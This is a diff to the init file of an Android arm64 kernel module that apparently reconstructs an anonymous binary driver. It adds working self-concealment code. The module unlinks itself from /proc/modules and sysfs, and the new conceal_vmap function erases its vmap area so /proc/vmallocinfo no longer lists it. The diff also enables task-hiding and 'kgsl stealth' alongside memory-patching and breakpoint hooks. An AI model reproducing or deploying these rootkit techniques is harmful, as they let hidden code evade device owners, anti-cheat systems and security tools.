@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: GPL-2.0
-/* Module entry point + compile-time module self-concealment. */
+// Module entry point + compile-time self-concealment (list unlink, sysfs kobject_del, vmap unlink).
 
 #include <linux/errno.h>
 #include <linux/init.h>
@@ -14,6 +14,11 @@
 #include <linux/poison.h>
 #endif
 
+#if KCFG_HIDE_VMAP
+#include <linux/rbtree.h>
+#include <linux/spinlock.h>
+#endif
+
 #include <asm/memory.h>
 #include <asm/page.h>
 #include <asm/sysreg.h>
@@ -21,52 +26,73 @@
 #include <driver/types.h>
 
 #include "comm.h"
+#include "hide_task.h"
 #include "hwbp.h"
 #include "kallsym.h"
 #include "lifecycle.h"
 #include "log.h"
 #include "memory.h"
+#include "stealth.h"
 #include "user_hook.h"
 
 struct drv_state drv;
 
 #if KCFG_HIDE_SELF_MODULE
-/* Preserve the original driver's self-concealment when requested at build
- * time. This directly mutates loader-owned state on every supported KMI. */
+/* Unlink THIS_MODULE from /proc/modules and /sys/module/<name>. */
 static void conceal_module(void) {
 	struct module *mod = THIS_MODULE;
-
-	/* Remove the module from /proc/modules and leave its list head valid. */
 	list_del(&mod->list);
 	INIT_LIST_HEAD(&mod->list);
-
-	/* Remove /sys/module/<name>, then reproduce the original binary's second
-	 * list_del() that poisons the detached kobject entry. */
 	kobject_del(&mod->mkobj.kobj);
 	list_del(&mod->mkobj.kobj.entry);
 }
 #endif
 
-/* Initialise drv.m_page_level and drv.m_pgd_va from TCR_EL1 / TTBR1_EL1 — the
- * values the binary captures at dispatch_ioctl case 0xD1 (DRV_CMD_INSTALL_HOOKS).
- * Computed once at module init so write_ro_memory (and every hook_install path)
- * sees them populated regardless of which ioctl arrives first.
- *
- * TCR_EL1.T1SZ is bits [21:16] and controls TTBR1_EL1 (kernel-half) VA size;
- * m_page_level = (60 - T1SZ) / 9 == ceil((48 - T1SZ) / 9). For VA_BITS=39
- * (NP05J / Vivo / Android 6.6 typical) T1SZ=25 -> level_count=3 (PUD->PMD->PTE).
- * For VA_BITS=48 (other GKI configs) T1SZ=16 -> level_count=4. LPA2 / VA_BITS=52
- * yields level_count=5. The process-memory walker uses the kernel's pgtable
- * helpers and supports it; the legacy text PTE-flip fallback rejects an
- * unsupported depth locally instead of blocking unrelated driver features. */
+#if KCFG_HIDE_VMAP
+/* struct vmap_area is opaque on 6.9+ (moved to mm/internal.h); we only need the leading fields, whose offsets are stable across 5.10..6.12: va_start@0, va_end@8, rb_node@16, list@40. */
+struct drv_vmap_area_lite {
+	unsigned long va_start;
+	unsigned long va_end;
+	struct rb_node rb_node;
+	struct list_head list;
+};
+
+/* Unlink this module's vmap area from vmap_area_list (which /proc/vmallocinfo iterates). Best-effort — silently no-ops if the required symbols are not resolvable through kallsyms (e.g. per-node vmap tree on 6.9+ without a single global root). */
+static void conceal_vmap(void) {
+	struct list_head *vmap_list = (struct list_head *)kallsym_lookup("vmap_area_list");
+	spinlock_t *vmap_lock = (spinlock_t *)kallsym_lookup("vmap_area_lock");
+	struct rb_root *vmap_root = (struct rb_root *)kallsym_lookup("vmap_area_root");
+	/* &init_driver lives in __init memory (freed after do_free_init) — pointing at it would leave the module_memfree path chasing a vm_area we already unlinked. drv is uninitialised core .bss, permanent for the module's lifetime. */
+	unsigned long probe = (unsigned long)(uintptr_t)&drv;
+	struct drv_vmap_area_lite *va, *tmp;
+	unsigned long flags = 0;
+	int erased = 0;
+
+	if (!vmap_list) {
+		LOGW("conceal_vmap: vmap_area_list not resolvable, skip\n");
+		return;
+	}
+	if (vmap_lock) spin_lock_irqsave(vmap_lock, flags);
+	list_for_each_entry_safe(va, tmp, vmap_list, list) {
+		if (probe < va->va_start || probe >= va->va_end) continue;
+		list_del(&va->list);
+		INIT_LIST_HEAD(&va->list);
+		if (vmap_root) rb_erase(&va->rb_node, vmap_root);
+		erased = 1;
+		LOGI("conceal_vmap: unlinked va %lx..%lx (probe %lx)\n", va->va_start, va->va_end, probe);
+		break;
+	}
+	if (vmap_lock) spin_unlock_irqrestore(vmap_lock, flags);
+	if (!erased) LOGW("conceal_vmap: no vmap area contained probe %lx\n", probe);
+}
+#endif
+
+/* TCR_EL1.T1SZ (bits 21:16) sets kernel-half VA size; page_level = (60 - T1SZ) / 9. VA_BITS=39 → 3 (PUD/PMD/PTE). VA_BITS=48 → 4. LPA2/VA_BITS=52 → 5. Captured once here so write_ro_memory + hooks see them populated. */
 static void mm_globals_init(void) {
 	u64 tcr = read_sysreg(tcr_el1);
 	u64 ttbr1 = read_sysreg(ttbr1_el1);
 	u32 t1sz = (tcr >> 16) & 0x3Fu;
-	/* Mask BADDR to the architectural maximum (CONFIG_ARM64_PA_BITS) and
-	 * page-align — discards both CnP (bit 0) and ASID (high half). */
 	u64 pgd_pa = ttbr1 & PHYS_MASK & PAGE_MASK;
-
 	drv.m_page_level = (60u - t1sz) / 9u;
 	drv.m_pgd_va = (u64)(uintptr_t)phys_to_virt(pgd_pa);
 }
@@ -74,54 +100,40 @@ static void mm_globals_init(void) {
 int __init init_driver(void) {
 	int ret;
 
-	pr_drv("driver_entry\n");
+	LOGI("driver_entry\n");
 
-	/* Capture swapper_pg_dir + pagewalk depth before any hook path can run -- write_ro_memory's level_count==0 guard would silently no-op every patch otherwise. */
 	mm_globals_init();
 
-	/* Do not reject the whole module based on the legacy text walker's
-	 * limits. write_ro_memory_pte_flip() is gated by granule and depth at
-	 * its call site; aarch64_insn_patch_text_nosync() and the process-memory
-	 * walkers are independent of drv.m_page_level. */
-	/* Resolve kallsyms_lookup_name + every kallsym-shimmed function pointer that a kprobe pre-handler may need (currently just task_work_add). Done here, in process context, so the prctl/reboot pre-handlers never re-enter register_kprobe in atomic context. */
+	/* kallsym_init resolves kallsyms_lookup_name + kallsym-shimmed pointers a kprobe pre-handler might need (currently task_work_add). Done here in process context — the prctl/reboot pre-handlers must not re-enter register_kprobe from atomic context. */
 	ret = kallsym_init();
-	if (ret < 0) {
-		pr_drv_err("kallsym_init failed: %d\n", ret);
-		return ret;
-	}
+	if (ret < 0) { LOGE("kallsym_init failed: %d\n", ret); return ret; }
 
-	/* Resolve the kernel's text patcher and get_cmdline BEFORE any ioctl/hook
-	 * path can use them. Missing symbols are non-fatal: the text writer uses
-	 * its locally gated fallback where supported, and package lookup reports
-	 * -EOPNOTSUPP. */
+	/* Missing symbols are non-fatal — the text writer falls back locally, package lookup reports -EOPNOTSUPP. */
 	(void)memory_init();
 
 	ret = comm_warm_symbols();
-	if (ret < 0) {
-		pr_drv_err("comm_warm_symbols failed: %d\n", ret);
-		return ret;
-	}
+	if (ret < 0) { LOGE("comm_warm_symbols failed: %d\n", ret); return ret; }
 
-	if (hwbp_init())
-		pr_drv_notice("hwbp commands disabled\n");
-	if (user_hook_init())
-		pr_drv_notice("pte-hook commands disabled\n");
+	if (hwbp_init()) LOGN("hwbp commands disabled\n");
+	if (user_hook_init()) LOGN("pte-hook commands disabled\n");
+	if (hide_task_init()) LOGN("hide_task commands disabled\n");
+	if (kgsl_stealth_arm()) LOGN("kgsl proactive stealth disabled\n");
 
 	ret = register_kprobe(&reboot_kp);
-	if (ret < 0) {
-		pr_drv_err("register_kprobe (__arm64_sys_reboot) failed: %d\n", ret);
-		return ret;
-	}
+	if (ret < 0) { LOGE("register_kprobe (__arm64_sys_reboot) failed: %d\n", ret); return ret; }
 
 #if KCFG_HIDE_SELF_MODULE
 	conceal_module();
+#endif
+#if KCFG_HIDE_VMAP
+	conceal_vmap();
 #endif
 	return 0;
 }
 
 module_init(init_driver);
 
-/* Cargo-culted namespace import preserved verbatim from the original .ko modinfo. The token does not name any namespace that exists in mainline Linux 5.4-6.12 (verified via Bootlin Elixir); MODULE_IMPORT_NS expands to a modinfo string only, so this is a no-op at build/load time, but we keep it because byte-exactness vs. the source binary is part of the spec. */
+/* Cargo-culted namespace tag preserved verbatim from the original .ko modinfo. The token does not name any namespace in mainline 5.4..6.12 (verified via Bootlin) — MODULE_IMPORT_NS expands to a modinfo string only, so this is a no-op at load time. */
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Anonymous");
 MODULE_DESCRIPTION("Android kernel driver");
